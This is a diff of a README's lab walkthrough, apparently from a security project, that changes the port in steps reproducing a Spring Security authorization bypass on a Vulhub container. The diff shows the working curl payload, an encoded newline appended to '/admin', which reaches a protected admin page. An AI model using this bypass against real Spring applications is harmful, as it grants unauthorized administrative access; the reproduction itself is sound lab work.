@@ -55,12 +55,12 @@ The project uses **GitHub Actions** (`.github/workflows/main.yml`) to automatica
 1. Started the vulnerable environment using Vulhub (`vulhub/spring-security:5.6.3`) via Docker Compose.
 2. Tested normal access to the protected route:
    ```bash
-   curl -i http://localhost:8080/admin
+   curl -i http://localhost:8081/admin
    ```
    Result: Returned HTTP/1.1 404 (Blocked by Spring Security).
 3. Executed the bypass payload by injecting an encoded newline:
    ```bash
-   curl --path-as-is -i "http://localhost:8080/admin/%0a"
+   curl --path-as-is -i "http://localhost:8081/admin/%0a"
    ```
 4. Result: The request bypassed the security filter and returned HTTP/1.1 200 OK, successfully accessing the protected admin page with the message "Congratulations, you are an admin!".
 
